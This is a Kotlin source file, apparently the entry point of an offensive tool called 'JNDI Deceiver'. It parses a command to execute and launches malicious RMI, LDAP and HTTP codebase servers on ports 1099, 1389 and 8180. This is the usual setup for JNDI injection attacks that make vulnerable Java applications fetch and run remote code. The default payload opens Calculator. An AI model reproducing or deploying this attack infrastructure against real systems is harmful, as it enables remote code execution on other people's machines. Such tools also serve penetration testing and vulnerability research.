import kotlinx.cli.ArgParser
import kotlinx.cli.ArgType
import kotlinx.cli.default
import util.Dict
import java.net.Inet4Address
import java.net.InetAddress
import java.net.NetworkInterface
import java.net.URL
import kotlin.concurrent.thread


const val RMI_PORT = 1099
const val LDAP_PORT = 1389
const val CODEBASE_PORT = 8180

fun main(args: Array<String>) {
    val parser = ArgParser("JNDI Deceiver")
    val command by parser
        .option(ArgType.String, shortName = "c", description = "command you want to exec")
        .default("open /System/Applications/Calculator.app")
    val address by parser
        .option(ArgType.String, shortName = "a", description = "ip or hostname of this server")
        .default(getDefaultAddr())
    parser.parse(args)

    println("""JNDI Deceiver
        |[ADDRESS]>> $address
        |[COMMAND]>> $command
    """.trimMargin())
    Dict.showMessage(address)

    // startup all servers
        val codebase = URL("http://$address:$CODEBASE_PORT/")

        val codeServer = CodeServer(CODEBASE_PORT, command)
        val rmiServer = RMIServer(RMI_PORT, command, codebase)
        val ldapServer = LDAPServer(LDAP_PORT, command, codebase)

        thread { codeServer.run() }
        thread { rmiServer.run() }
        thread { ldapServer.run() }
}

/**
 * 获取本地网卡的第一个 IP 作为默认地址
 */
private fun getDefaultAddr(): String {
    val netInterfaces = NetworkInterface.getNetworkInterfaces()
    while (netInterfaces.hasMoreElements()) {
        val elem = netInterfaces.nextElement()
        if (elem.isLoopback || !elem.isUp) continue

        elem.interfaceAddresses.forEach {
            val addr = it.address
            if (addr is Inet4Address) return addr.hostAddress
        }
    }
    return InetAddress.getLocalHost().hostAddress
}
